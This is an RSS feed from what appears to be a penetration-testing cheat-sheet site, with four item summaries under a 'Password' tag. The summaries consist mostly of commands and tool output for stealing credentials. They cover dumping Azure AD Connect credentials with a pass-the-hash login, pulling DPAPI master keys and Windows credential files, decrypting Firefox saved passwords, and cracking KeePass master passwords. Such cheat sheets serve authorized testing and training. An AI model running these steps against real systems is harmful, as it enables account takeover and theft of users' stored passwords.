<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Password on TLDRBins</title>
    <link>https://tldrbins.github.io/@password/</link>
    <description>Recent content in Password on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 21 Feb 2025 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://tldrbins.github.io/@password/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Azure AD Connect</title>
      <link>https://tldrbins.github.io/azure_ad/</link>
      <pubDate>Fri, 21 Feb 2025 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/azure_ad/</guid>
      <description>Abuse #1: Azure AD Connect Password Extraction Windows 1. Start ADSync Service Set-Service -name adsync -StartupType automatic Set-Service -name adsync -status running -passthru Set-Service -name adsync -status running -passthru WARNING: Waiting for service &amp;#39;Microsoft Azure AD Sync (adsync)&amp;#39; to start... Status Name DisplayName ------ ---- ----------- Running adsync Microsoft Azure AD Sync 2. Download ADSync.mdf and ADSync_log.LDF python3 adconnectdump.py &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET_DOMAIN&amp;gt; -hashes :&amp;lt;HASH&amp;gt; $ python3 adconnectdump.py SRV001/Administrator@srv001.example.local -hashes :7ddf32e17a6ac5ce04a8ecbf782ca509 Azure AD Connect remote credential dumper - by @_dirkjan [*] Stopping service ADSync [*] Downloading ADSync database files [*] Starting service ADSync [*] Querying database for configuration data [-] RemoteOperations failed: [Errno 2] No such file or directory: &amp;#39;ADSyncQuery.</description>
    </item>
    <item>
      <title>DPAPI</title>
      <link>https://tldrbins.github.io/dpapi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dpapi/</guid>
      <description>Abuse #1: Credentials Dump (From Linux) pypykatz DonPAPI 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Retrieve Keys # Get master key certutil -encode &amp;#34;C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;MASTERKEY&amp;gt;&amp;#34; C:\ProgramData\&amp;lt;MASTERKEY&amp;gt; # Copy and paste to local Linux type C:\ProgramData\&amp;lt;MASTERKEY&amp;gt; # Base64 decode cat masterkey_b64 | base64 -d &amp;gt; masterkey_file # Get credential certutil -encode &amp;#34;C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34; C:\ProgramData\&amp;lt;CREDENTIALS_HASH&amp;gt; # Copy and paste to local Linux type C:\ProgramData\&amp;lt;CREDENTIALS_HASH&amp;gt; # Base64 decode cat credential_b64 | base64 -d &amp;gt; credential_file 3.</description>
    </item>
    <item>
      <title>Firefox</title>
      <link>https://tldrbins.github.io/firefox/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/firefox/</guid>
      <description>Browse History Windows # Locate sqlite $firefoxProfile = Get-ChildItem -Path &amp;#34;$env:APPDATA\Mozilla\Firefox\Profiles\&amp;#34; -Directory | Where-Object { $_.Name -like &amp;#34;*.default-release*&amp;#34; }; $historyDb = Join-Path $firefoxProfile.FullName &amp;#34;places.sqlite&amp;#34;; $historyDb Extract Saved Passwords firefox_decrypt firepwd # Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /&amp;lt;PATH&amp;gt;/profiles.ini/ Ref: firefox_decrypt&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py Ref: firepwd</description>
    </item>
    <item>
      <title>Keepass</title>
      <link>https://tldrbins.github.io/keepass/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/keepass/</guid>
      <description>Crack Master Password keepass2john &amp;lt;KDBX_FILE&amp;gt; &amp;gt; hash # With a key file keepass2john -k &amp;lt;KEY_FILE&amp;gt; &amp;lt;KDBX_FILE&amp;gt; &amp;gt; hash Basic Windows # Open kdbx kpcli --kdb &amp;lt;KDBX_FILE&amp;gt; # Open kdbx with a key file kpcli --key &amp;lt;KEY_FILE&amp;gt; --kdb &amp;lt;KDBX_FILE&amp;gt; # List all passwords find . # Show password (e.g. #0) show -f 0 # Export attachment (e.g. #0) attach 0 Ref: Download kpcli</description>
    </item>
  </channel>
</rss>
